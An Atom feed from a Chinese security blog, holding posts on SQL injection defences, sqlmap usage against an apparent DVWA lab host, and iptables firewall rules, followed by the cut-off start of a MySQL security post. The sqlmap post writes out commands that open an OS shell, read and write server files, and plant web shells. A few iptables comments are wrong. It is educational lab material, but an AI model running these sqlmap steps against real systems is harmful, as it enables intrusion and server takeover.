<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0verWatch&#39;s Blog</title>
  
  <subtitle>学习本无底，前进莫彷徨</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="0verwatch.top/"/>
  <updated>2018-08-02T15:11:04.210Z</updated>
  <id>0verwatch.top/</id>
  
  <author>
    <name>0verWatch</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>浅谈SQL注入防御手段</title>
    <link href="0verwatch.top/2018/08/02/sql-inject-protect/"/>
    <id>0verwatch.top/2018/08/02/sql-inject-protect/</id>
    <published>2018-08-02T15:08:29.000Z</published>
    <updated>2018-08-02T15:11:04.210Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="sql语句预编译"><a href="#sql语句预编译" class="headerlink" title="sql语句预编译"></a>sql语句预编译</h3><p>例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"select id, no from user where id=?"</span>;</span><br><span class="line">      PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">      ps.setInt(<span class="number">1</span>, id);</span><br><span class="line">      ps.executeQuery();</span><br></pre></td></tr></table></figure><p>这里采用了<code>PreparedStatement</code>，就会将sql语句<code>预先编译</code>好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该sql语句的 语法结构了，因为语法分析已经完成了，而语法分析主要是分析sql命令，比如 <code>select ,from ,where ,and, or ,order by</code> 等等。所以即使你后面输入了这些sql命令，也不会被当成sql命令来执行了，因为这些sql命令的执行， 必须先的通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为sql命令来执行的，只会被当做字符串字面值参数。所以sql语句预编译可以防御sql注入</p><p>讲一下另外一个预编译，就是用PDO，这里就推荐几篇文章自己看一下，简单说一下就是原理跟上面的差不多，把执行语句和变量分开，变量分别绑定，分别传参，从而阻止了注入，只是底层不太明了，自己真菜。。<br><a href="https://segmentfault.com/q/1010000000723496" target="_blank" rel="noopener">https://segmentfault.com/q/1010000000723496</a><br><a href="http://www.cnblogs.com/zl0372/p/php_28.html" target="_blank" rel="noopener">http://www.cnblogs.com/zl0372/p/php_28.html</a><br><a href="https://blog.csdn.net/theVicTory/article/details/62884352" target="_blank" rel="noopener">https://blog.csdn.net/theVicTory/article/details/62884352</a></p><p>预编译方法就最有效！！也是如今市场上最流行的方式了</p><h3 id="检查变量数据类型和格式"><a href="#检查变量数据类型和格式" class="headerlink" title="检查变量数据类型和格式"></a>检查变量数据类型和格式</h3><p>例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$uid=checkuid($uid);    <span class="comment">//检测$uid是不是数字类型,不是不继续往下运行</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;‘;</span></span><br><span class="line"><span class="string">```</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">这段语句是为了保证了id是数字类型，checkid是一个`自定义`的函数，但是千万别直接里面写一个`is_numeric`就结束了啊，这很容易就可以用16进制或者是科学计数法去绕过的，这个还是少用吧，毕竟自写函数就像是写黑名单，肯定会有纰漏的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### 过滤特殊字符</span></span><br><span class="line"><span class="string">这个方法也相当于`黑名单`，还是少用为好，一般有纰漏就可以去绕过的了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">例如：</span></span><br><span class="line"><span class="string">```php</span></span><br><span class="line"><span class="string">public static boolean sql_inj(String str) </span></span><br><span class="line"><span class="string">&#123; </span></span><br><span class="line"><span class="string">String inj_str = “’|and|exec|insert|select|delete|update| </span></span><br><span class="line"><span class="string">count|*|%|chr|mid|master|truncate|char|declare|;|or|-|+|,”; </span></span><br><span class="line"><span class="string">String inj_stra[] = split(inj_str,”|”); </span></span><br><span class="line"><span class="string">for (int i=0 ; i &lt; inj_stra.length ; i++ ) </span></span><br><span class="line"><span class="string">&#123; if (str.indexOf(inj_stra[i])&gt;=0) &#123; return true; &#125; </span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string">return false; </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></p><p>黑名单只能追求全面去避免SQL注入了</p><h3 id="转译特殊符号"><a href="#转译特殊符号" class="headerlink" title="转译特殊符号"></a>转译特殊符号</h3><p>例如:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;'"</span>;</span><br></pre></td></tr></table></figure></p><p>这里就是利用了<code>addslashes</code>函数去对特殊字符进行转义，比如单引号会被转译成<code>\’</code>，所以无法闭合和注释。不能达到sql注入攻击的效果。一般在CTF题目里面如果我看到这个函数的话，我会预测有75%可能不是SQL注入，先去看看其他点是否存在漏洞</p><h3 id="从中间件配置上防止SQL注入"><a href="#从中间件配置上防止SQL注入" class="headerlink" title="从中间件配置上防止SQL注入"></a>从中间件配置上防止SQL注入</h3><p>通过启用php.ini配置文件中的<code>magic_quote_gpc (魔术字符)</code>，就可以将大部分想利用SQL注入漏洞的骇客拒绝于门外。开启<code>magic_quote_gpc=on</code>之后，能实现<code>addslshes()</code>和<code>stripslashes()</code>这两个函数的功能，这就从很大程度上防止了sql注入。<code>PHP 5.4</code> 之前 PHP 指令 <code>magic_quotes_gpc</code> 默认是 <code>on</code>， 实际上所有的 GET、POST 和 COOKIE 数据都用被 <code>addslashes()</code> 了。 不要对已经被 <code>magic_quotes_gpc</code> 转义过的字符串使用 <code>addslashes()</code>，因为这样会导致<code>双层转义</code>。 遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测<br>但是只开启<code>magic_quote_gpc</code> ，对防止sql注入是远远不够的。<br>例如以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid=&#123;$uid&#125;"</span>;</span><br></pre></td></tr></table></figure><p>在这条sql语句中并没有单引号的保护，攻击者既不需要闭合单引号也不需要注释单引号，所以gpc开启对sql注入攻击的防范并没有作用。所以说变量还是要用引号包住才好，别直接就赋值了。。。</p><h3 id="通过安全waf去防御"><a href="#通过安全waf去防御" class="headerlink" title="通过安全waf去防御"></a>通过安全waf去防御</h3><p>过安全waf达到一定程度防御,软件层面的不多说。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>总的来说，现在很多网站多不会再使用字符串拼接去查找数据库里面的内容了，大多数现在使用的是预编译，除了那些荒废的网站以及CTF题目里面会使用，那是不是说以后挖洞挖SQL注入的就比较难了233333。。。我还是太年轻了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;sql语句预编译&quot;&gt;&lt;a href=&quot;#sql语句预编译&quot; class=&quot;headerlink&quot; title=&quot;sql语句预编译&quot;&gt;&lt;/a&gt;sql语句预编译&lt;/h3&gt;&lt;p&gt;例如:&lt;/p&gt;
&lt;figure class=&quot;highl
      
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap-usage</title>
    <link href="0verwatch.top/2018/08/02/sqlmap-usage/"/>
    <id>0verwatch.top/2018/08/02/sqlmap-usage/</id>
    <published>2018-08-02T14:05:38.000Z</published>
    <updated>2018-08-02T15:11:06.494Z</updated>
    
    <content type="html"><![CDATA[<p>平常的使用GET方法像–tables –columns -T -D –dbs –dump 啥的就不说了，只是博客几天不发，空着不好，还是得写写东西<a id="more"></a></p><p>前置知识<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--is-dba 当前用户权限（是否为root权限，mssql下最高权限为sa）</span><br><span class="line">--dbs 所有数据库</span><br><span class="line">--current-db 网站当前数据库</span><br><span class="line">--users 所有数据库用户</span><br><span class="line">--current-user 当前数据库用户</span><br><span class="line">--random-agent 构造随机user-agent</span><br><span class="line">--passwords 数据库密码</span><br><span class="line">--proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒</span><br><span class="line">--threads=                       使用多少线程</span><br></pre></td></tr></table></figure></p><p><code>--is-dba</code> 这个命令有时候决定了你是否可以在服务器下进行写的操作，这个很重要，是否有写的权限，代表你是否可以在服务器上面写入一句话木马</p><h3 id="利用sqlmap进行POST注入"><a href="#利用sqlmap进行POST注入" class="headerlink" title="利用sqlmap进行POST注入"></a>利用sqlmap进行POST注入</h3><p>先利用bp去抓一个包，直接发送包里面的内容保存到一个文件里面，然后用<code>-r</code>参数去实现它就好<br>例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql</span><br><span class="line">```    </span><br><span class="line">指定username参数，-dbms指定了某种数据库，这句话指定的是mysql数据库，-p指定的是参数，不指定的话每一个参数他都会尝试</span><br><span class="line">注意这句话已经不像平常那样需要`-u`参数了，直接`-r`参数即可，因为报文里面已经含有了含有应有的各种条件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 利用sqlmap进行需要登陆的注入</span><br><span class="line">可以跟上面进行post注入的一样，直接`-r`参数带上你的抓包文件路径，既然是需要登录的注入，那么报文里面肯定是要有`cookie`的</span><br><span class="line">我们还可以利用<span class="comment">--cookie参数注入，例如: </span></span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp; Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --current-db</span></span><br></pre></td></tr></table></figure><p>这里面的cookie参数可以抓包获得</p><h3 id="利用sqlmap进行交互式写shell"><a href="#利用sqlmap进行交互式写shell" class="headerlink" title="利用sqlmap进行交互式写shell"></a>利用sqlmap进行交互式写shell</h3><p>这个要利用sqlmap写shell的话前提需要获取网站的绝对路径，而且必须叙是root权限</p><p>使用burpsuite进行抓包，获取cookie。判断用户是否为dba，输入命令：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --is-dba</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g9pT.png" alt="P0g9pT.png"></p><p>  输入命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --os-shell</span></span><br></pre></td></tr></table></figure><p>  脚本类型为PHP，所以输入4<br><img src="https://s1.ax1x.com/2018/08/02/P0gC1U.png" alt="P0gC1U.png">     </p><p>   输入第二步得到的路径，这样就可以在里面写相关命令了<br><img src="https://s1.ax1x.com/2018/08/02/P0gknJ.png" alt="P0gknJ.png"></p><p><img src="https://s1.ax1x.com/2018/08/02/P0gu9K.png" alt="P0gu9K.png"><br>这时候会在绝对路径下写入2个shell，一个用来执行命令的，另一个是用来上传的，其中上传的文件名为tmpujhum.php，这个上传的文件可以去上传小马然后连接即可，这里我们注意一下，为什么会出现admin admin这样的文字，这是sqlmap用来确认是否成功写进shell的标志，后面也会提一下。他这个写进admin的方式有可能会导致利用sqlmap写文件的时候小马文件会出现乱码。猜测是写文件的方式导致了文件的乱码，我们都知道写文件的方式要么就是ASCII要么是二进制文件流方式去实现。</p><h3 id="利用sqlmap辅助手工注入"><a href="#利用sqlmap辅助手工注入" class="headerlink" title="利用sqlmap辅助手工注入"></a>利用sqlmap辅助手工注入</h3><p>其实这个就是介绍了在发现注入点之后，怎么在sqlmap里面执行SQL语句，继续用上面的例子，改一下就是这样子的，但前提我们也是要发现数据点<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --sql-query "select user(),version(),database()"</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g3Bd.png" alt="P0g3Bd.png"><br>这样就是相当于运行对应的SQL语句了。但是其实这样执行的话每一次都会对网站注入一遍，效率就比较低.<br>可以换一个方式，把<code>--sql-query</code>改为<code>--sql-shell</code>,这样一来就相当于平常我们执行SQL语句的那个cmd命令界面一样。写一条语句就直接执行一条，省去了注入的过程。</p><h3 id="利用sqlmap进行文件读写"><a href="#利用sqlmap进行文件读写" class="headerlink" title="利用sqlmap进行文件读写"></a>利用sqlmap进行文件读写</h3><p>这里可以写文件的话前提必须有<br>判断是否为<code>dba/root用户</code>，爆出了网站的绝对路径，有一个可写目录，也是用上面的案例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-read=/opt/lampp/htdocs/php.ini</span></span><br></pre></td></tr></table></figure><p>成功读取了<code>php.ini</code>文件，并返回了路径。</p><p><img src="https://s1.ax1x.com/2018/08/02/P0g8HA.png" alt="P0g8HA.png"><br> 打开如下图所示：<br>      这里的文件我们可以去sqlmap的output里面查看，也就是对应的用户文件夹里面</p><p>在服务器端写入文件<br>      输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-write C:\1.txt --file-dest /opt/lampp/htdocs/vulnerabilities/exec/1.txt</span></span><br></pre></td></tr></table></figure><p>  这里的意思就是将本地<code>C:\1.txt</code> 写入到服务器端<code>/opt/lampp/htdocs/vulnerabilities/exec/1.txt</code></p><p>打开对应文件的网站路径如下图：<br><img src="https://s1.ax1x.com/2018/08/02/P0gJAI.png" alt="P0gJAI.png">      </p><p>这里又出现了admin admin了，就是sqlmap用来确认是否写成功的标志，因为在写文件的过程中他会问是否验证，它就会以这个标志来判断啦。</p><p><img src="https://s1.ax1x.com/2018/08/02/P0gYNt.png" alt="P0gYNt.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平常的使用GET方法像–tables –columns -T -D –dbs –dump 啥的就不说了，只是博客几天不发，空着不好，还是得写写东西
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Linux防火墙学习</title>
    <link href="0verwatch.top/2018/07/29/Linux-FW/"/>
    <id>0verwatch.top/2018/07/29/Linux-FW/</id>
    <published>2018-07-29T15:32:03.000Z</published>
    <updated>2018-07-29T15:38:14.116Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux下<code>iptables</code>的设置，设置了它就能够有效地过滤掉相关的数据包从而阻挡相关攻击，感觉这个东西跟安全有很大用处，比如在我们学习的计算机网络知识里面，网络拓扑十分瓜皮，路由器没有过滤数据包的功能，直接就实现路由转发的过程，这样就会对一个LAN造成很大的安全隐患，<a id="more"></a>现在我要更正一下自己的思路，路由器不单单实现转发功能，我现在还把他看成一台可以实现过滤功能的电脑，这样就对它所连接的LAN有保护作用了，但现在一般对于网络防火墙而言很少再使用<code>iptables</code>了，现在一般都用一些大型厂商提供的防火墙。比如华3，深信服之类的，说白了就是牛逼了一点的电脑，但是对于一台服务器而言还是可以设置规则来防止别人拿下服务器的。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>netfilter</code>    ：位于Linux内核中的包过滤功能体系，称为Linux防火墙的“内核态”<br><code>iptables</code>：位于/sbin/iptables，用来管理防火墙规则的工具，称为Linux防火墙的“用户态”</p><p>—— 上述2种称呼都可以表示Linux防火墙<br>其实用户层面使用iptables也是去调用内核里面的netfilter，这是操作系统里面的知识就不多说了</p><h3 id="Linux查看防火墙状态"><a href="#Linux查看防火墙状态" class="headerlink" title="Linux查看防火墙状态"></a>Linux查看防火墙状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service iptables start 启动防火墙</span><br><span class="line">service iptables status 查看防火墙状态，还可以使用这样一条命令iptables -L --line-numbers查看较为详细的命令</span><br><span class="line">service iptables stop 停止服务</span><br></pre></td></tr></table></figure><p>如果是阿里云的主机好像没有这个服务，他是直接在网页上让你设置防火墙，这是我自己的阿里云主机，命令行界面不能设置，但是在网页端可已自行控制端口的开放以及各种规则<br><img src="https://s1.ax1x.com/2018/07/29/Pa5y1f.png" alt="Pa5y1f.png"></p><p><a href="https://imgchr.com/i/Pa5vNR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/Pa5vNR.md.png" alt="Pa5vNR.md.png"></a></p><h3 id="包过滤的工作层次"><a href="#包过滤的工作层次" class="headerlink" title="包过滤的工作层次"></a>包过滤的工作层次</h3><p>主要实现在网络层也就是对IP数据包的处理上，详细一点就是对ip地址以及端口做处理<br><a href="https://imgchr.com/i/PaI8Ej" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaI8Ej.md.png" alt="PaI8Ej.md.png"></a></p><p>下面是些先行知识，关于iptables的链表结构</p><h3 id="规则链"><a href="#规则链" class="headerlink" title="规则链"></a>规则链</h3><p>规则的作用：对数据包进行过滤或处理<br>链的作用：容纳各种防火墙规则<br>链的分类依据：处理数据包的不同时机</p><p>默认包括5种规则链<br><code>INPUT</code>：处理入站数据包<br><code>OUTPUT</code>：处理出站数据包<br><code>FORWARD</code>：处理转发数据包<br><code>POSTROUTING</code>链：在进行路由选择后处理数据包<br><code>PREROUTING</code>链：在进行路由选择前处理数据包</p><p>上面这5种规则，在现实生活中一般不是全都是使用</p><h3 id="规则表"><a href="#规则表" class="headerlink" title="规则表"></a>规则表</h3><p>表的作用：容纳各种规则链<br>表的划分依据：防火墙规则的作用相似</p><p>默认包括4个规则表<br><code>raw</code>表：确定是否对该数据包进行状态跟踪<br><code>mangle</code>表：为数据包设置标记<br><code>nat</code>表：修改数据包中的源、目标IP地址或端口<br><code>filter</code>表：确定是否放行该数据包（过滤）<br>常用的就是其中<strong>filter</strong>表<strong>nat</strong>表多用于实现ip的转化功能，这里的表功能个人感觉相当于链下面的表功能，每种链都存在这四种表</p><h3 id="规则表之间的默认优先级"><a href="#规则表之间的默认优先级" class="headerlink" title="规则表之间的默认优先级"></a>规则表之间的默认优先级</h3><p><code>raw&gt;mangle&gt;nat&gt;filter</code><br>规则链之间的默认优先级<br>入站：<code>PREROUTING&gt;INPUT</code><br>出站：<code>OUTPUT&gt;POSTROUTING</code><br>转发：<code>PREROUTING&gt;FORWARD&gt;POSTROUTING</code><br>规则链内的匹配顺序<br>按顺序依次检查，匹配即停止（LOG策略例外）<br>若找不到相匹配的规则，则按该链的默认策略处理，这跟路由转发还是有点区别的<br><a href="https://imgchr.com/i/PaIBb4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaIBb4.md.png" alt="PaIBb4.md.png"></a></p><p>整个基本流程大概就是这样，反正吧现在的网络环境一般都是只需要其中的一部分</p><h3 id="命令实现"><a href="#命令实现" class="headerlink" title="命令实现"></a>命令实现</h3><p>基本格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables  [-t 表名]  选项  [链名]  [条件]  [-j 控制类型]</span><br></pre></td></tr></table></figure><p>几个<code>注意事项</code><br>不指定表名时，默认指filter表<br>不指定链名时，默认指表内的所有链<br>除非设置链的默认策略，否则必须指定匹配条件<br>选项、链名、控制类型使用大写字母，其余均为小写</p><p>数据包的常见控制类型<br><code>ACCEPT</code>：允许通过<br><code>DROP</code>：直接丢弃，不给出任何回应<br><code>REJECT</code>：拒绝通过，必要时会给出提示<br><code>LOG</code>：记录日志信息，然后传给下一条规则继续匹配</p><p>添加新的规则,这里考虑到他的匹配规则必要的时候需要换一下命令<br><code>-A</code>：在链的末尾追加一条规则<br><code>-I</code>：在链的开头（或指定序号）插入一条规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -A INPUT -p tcp -j ACCEPT   直接在最后加入规则</span><br><span class="line">iptables -I INPUT 2 -p icmp -j ACCEPT 这样就是在第二条后面插入规则</span><br></pre></td></tr></table></figure><p>删除、清空规则<br><code>-D</code>：删除链内指定序号（或内容）的一条规则<br><code>-F</code>：清空所有的规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> iptables -F  清空所有规则</span><br><span class="line">iptables -D INPUT 3  删除第三条规则</span><br></pre></td></tr></table></figure><p>设置默认策略<br><code>-P</code>：为指定的链设置默认规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -P FORWARD DROP  给FORWARD链默认设置DROP规则</span><br></pre></td></tr></table></figure><p>协议匹配：<code>-p</code> 协议名<br>地址匹配：<code>-s</code> 源地址、<code>-d</code> 目的地址<br>接口匹配：<code>-i</code> 入站网卡、<code>-o</code> 出站网卡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -p ! icmp -j ACCEPT  这条命令的意思就是除了icmp协议之外的所有协议都ACCEPT</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s 10.20.30.0/24 -j DROP  这条命令的意思就是把来自10.20.30.0这一个网段的包全都丢掉，有效防止了DDOS攻击</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP </span><br><span class="line">iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP</span><br><span class="line">iptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROP</span><br></pre></td></tr></table></figure><p>上面这三条命令也很有实际意义，假设有人恶意串改了源地址，同时把这个包发送到内网，内网的机子会对这种包做出响应，此时源地址变成目的地址，就会直接在内网里面一个个尝试对应IP从而可以攻击内网的机子，因为这种源IP是内网地址的是不可能出现在互联网上的，理所当然应该禁止</p><p>端口匹配：<code>--sport</code>源端口、<code>--dport</code> 目的端口<br>TCP标记匹配：<code>--tcp-flags</code> 检查范围 被设置的标记<br>ICMP类型匹配：<code>--icmp-type</code> ICMP类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -s 192.168.4.0/24 -p udp --dport 53 -j ACCEPT   对于192.168.4.0这个网段的DNS服务开启做相应规则</span><br><span class="line">iptables -A INPUT -p tcp --dport 20:21 -j ACCEPT 禁止FTP</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -j DROP</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 3 -j ACCEPT</span><br></pre></td></tr></table></figure><p>这就是我前面讲的对应自己ping别人可收到响应报文，别人却ping不到你，有效降低你被别人攻击的可能</p><p>再来看看一个例子<br>输入命令<code>iptables -t filter -I INPUT -p icmp -j REJECTED</code><br>这条命令是对进入的数据包进行icmp所有协议包进行过滤，需要注意两点第一，控制类型不一样返回的效果也不一样，第二对于icmp这种类型的报文而言，响应包跟请求包都被截了，后面会讲到如何可以接受icmp响应包而不接受请求包<br>然后尝试ping一下对面的机子，这是拒绝(REJECT)的效果<br><img src="https://s1.ax1x.com/2018/07/29/PaIsa9.png" alt="PaIsa9.png"></p><p>这是直接丢弃(DROP)的效果<br><img src="https://s1.ax1x.com/2018/07/29/PaIy5R.png" alt="PaIy5R.png"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本来还想写写Windows下的防火墙，但由于是图形化界面，学起来也容易上手，就没写了，我比较懒~~~</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Linux下&lt;code&gt;iptables&lt;/code&gt;的设置，设置了它就能够有效地过滤掉相关的数据包从而阻挡相关攻击，感觉这个东西跟安全有很大用处，比如在我们学习的计算机网络知识里面，网络拓扑十分瓜皮，路由器没有过滤数据包的功能，直接就实现路由转发的过程，这样就会对一个LAN造成很大的安全隐患，
    
    </summary>
    
      <category term="环境部署" scheme="0verwatch.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    
      <category term="Linux安全" scheme="0verwatch.top/tags/Linux%E5%AE%89%E5%85%A8/"/>
    
      <category term="服务器运维" scheme="0verwatch.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Mysql安全配置</title>
    <link href="0verwatch.top/2018/07/26/Mysql-security-1/"/>
    <id>0verwatch.top/2018/07/26/Mysql-security-1/</id>
    <published>2018-07-26T12:35:31.000Z</published>
    <updated>2018-07-26T12:37:15.855Z</updated>
    
